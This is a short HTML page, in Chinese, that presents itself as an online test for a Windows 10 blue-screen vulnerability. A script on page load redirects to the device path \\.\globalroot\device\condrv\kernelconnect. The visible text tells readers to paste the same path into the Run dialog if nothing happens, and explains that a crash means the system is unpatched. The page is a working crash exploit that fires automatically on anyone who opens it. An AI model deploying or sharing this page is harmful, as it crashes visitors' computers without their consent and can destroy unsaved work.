<!DOCTYPE Html>
<html>
<head>
<title>Windows10在线蓝屏漏洞测试</title>
</head>
<body>
<div>如果你能看到本文字，那么你的系统要么不是WIN10 1709以后的版本，要么浏览器不支持自动访问测试地址，请手动复制该链接再次尝试，如果还是没有，则漏洞已经修复或无此漏洞：    "\\.\globalroot\device\condrv\kernelconnect"    请复制前面的链接（不含引号），按WINDOWS徽标键+R键，打开运行窗口，粘贴，然后回车，如果弹出无法访问此网络地址请点击诊断按钮，蓝屏则漏洞尚未修复的，反之则已经修复。</div>
</body>
<script>document.location='\\\\.\\globalroot\\device\\condrv\\kernelconnect';</script>
</html>
